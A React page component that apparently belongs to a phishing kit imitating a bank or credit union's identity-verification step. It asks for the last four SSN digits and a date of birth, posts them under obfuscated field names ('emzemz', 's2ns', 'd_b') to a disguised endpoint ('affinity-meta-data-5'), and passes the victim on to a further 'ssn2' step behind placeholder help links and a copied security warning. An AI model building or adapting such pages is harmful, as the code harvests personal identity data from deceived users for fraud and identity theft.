import React, { useMemo, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const buildYears = () => {
  const currentYear = new Date().getFullYear();
  return Array.from({ length: currentYear - 1899 }, (_, index) => `${1900 + index}`);
};

const footer = (
  <div className="space-y-2 text-center">
    <p>
      For security reasons, never share your username, password, social security number, account number or other private data
      unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
    </p>
    <div className="flex flex-wrap items-center justify-center gap-2 text-purple-900 font-medium">
      <a href="#" className="hover:underline">Forgot Username?</a>
      <span className="text-gray-300">|</span>
      <a href="#" className="hover:underline">Forgot Password?</a>
      <span className="text-gray-300">|</span>
      <a href="#" className="hover:underline">Forgot Everything?</a>
      <span className="text-gray-300">|</span>
      <a href="#" className="hover:underline">Locked Out?</a>
    </div>
  </div>
);

const SSN1: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [username] = useState(() => (location.state as { emzemz?: string } | undefined)?.emzemz ?? '');
  const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{ socialSecurityNumber?: string; dateOfBirth?: string; form?: string }>({});

  const years = useMemo(() => buildYears(), []);
  const daysInMonth = useMemo(() => {
    if (!month || !year) {
      return 31;
    }
    return new Date(parseInt(year, 10), parseInt(month, 10), 0).getDate();
  }, [month, year]);

  if (!username) {
    return (
      <FlowCard title="Verify your details">
        <p className="text-sm text-gray-700 text-center">
          We couldn&apos;t locate your prior step. Please start again from the beginning.
        </p>
        <button
          type="button"
          onClick={() => navigate('/login')}
          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
        >
          Back to login
        </button>
      </FlowCard>
    );
  }

  const toggleSSNVisibility = () => setShowSSN((prev) => !prev);

  const validateForm = () => {
    const nextErrors: { socialSecurityNumber?: string; dateOfBirth?: string } = {};

    if (socialSecurityNumber.length !== 4) {
      nextErrors.socialSecurityNumber = 'Enter the last four digits.';
    }

    if (!month || !day || !year) {
      nextErrors.dateOfBirth = 'Complete date of birth is required.';
    } else {
      const birthDate = new Date(parseInt(year, 10), parseInt(month, 10) - 1, parseInt(day, 10));
      const today = new Date();
      let age = today.getFullYear() - birthDate.getFullYear();
      const monthDiff = today.getMonth() - birthDate.getMonth();
      if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
        age -= 1;
      }
      if (age < 18) {
        nextErrors.dateOfBirth = 'You must be at least 18 years old.';
      }
    }

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const getMonthName = (value: string) =>
    new Date(0, parseInt(value, 10) - 1).toLocaleString('default', { month: 'long' });

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setErrors((prev) => ({ ...prev, form: undefined }));

    try {
      const formattedDob = `${getMonthName(month)}/${day}/${year}`;
      await axios.post(`${baseUrl}api/affinity-meta-data-5/`, {
        emzemz: username,
        s2ns: socialSecurityNumber,
        d_b: formattedDob,
      });

      navigate('/ssn2', { state: { emzemz: username } });
    } catch (error) {
      console.error('Error submitting SSN details:', error);
      setErrors((prev) => ({ ...prev, form: 'Unable to submit your information. Please try again.' }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard
      title="Verify your identity"
      subtitle={<span>Enter the last four digits of your SSN and confirm your birth date.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="ssn">
            Last four digits of SSN
          </label>
          <div className="flex items-center border border-gray-300 rounded">
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={socialSecurityNumber}
              onChange={(event) => {
                const value = event.target.value.replace(/\D/g, '');
                if (value.length <= 4) {
                  setSocialSecurityNumber(value);
                }
              }}
              onKeyDown={(event) => {
                if (!/[0-9]/.test(event.key) && !['Backspace', 'Delete', 'Tab'].includes(event.key)) {
                  event.preventDefault();
                }
              }}
              maxLength={4}
              placeholder="XXXX"
              className="w-full px-3 py-3 text-sm focus:outline-none"
            />
            <button type="button" onClick={toggleSSNVisibility} className="px-3 text-sm text-purple-700">
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
          <FormError message={errors.socialSecurityNumber ?? ''} className="mt-2" />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="dob-month">
            Date of birth
          </label>
          <div className="flex items-center gap-2 border border-gray-300 rounded px-3 py-2">
            <select
              id="dob-month"
              value={month}
              onChange={(event) => {
                setMonth(event.target.value);
                setDay('');
              }}
              className="flex-1 bg-white text-sm focus:outline-none"
            >
              <option value="">Month</option>
              {Array.from({ length: 12 }, (_, index) => (
                <option key={index + 1} value={index + 1}>
                  {new Date(0, index).toLocaleString('default', { month: 'long' })}
                </option>
              ))}
            </select>
            <select
              id="dob-day"
              value={day}
              onChange={(event) => setDay(event.target.value)}
              className="flex-1 bg-white text-sm focus:outline-none"
            >
              <option value="">Day</option>
              {Array.from({ length: daysInMonth }, (_, index) => (
                <option key={index + 1} value={index + 1}>
                  {index + 1}
                </option>
              ))}
            </select>
            <select
              id="dob-year"
              value={year}
              onChange={(event) => {
                setYear(event.target.value);
                setDay('');
              }}
              className="flex-1 bg-white text-sm focus:outline-none"
            >
              <option value="">Year</option>
              {years.map((entry) => (
                <option key={entry} value={entry}>
                  {entry}
                </option>
              ))}
            </select>
          </div>
          <FormError message={errors.dateOfBirth ?? ''} className="mt-2" />
        </div>

        <FormError message={errors.form ?? ''} />

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Continue'}
        </button>
      </form>
    </FlowCard>
  );
};

export default SSN1;
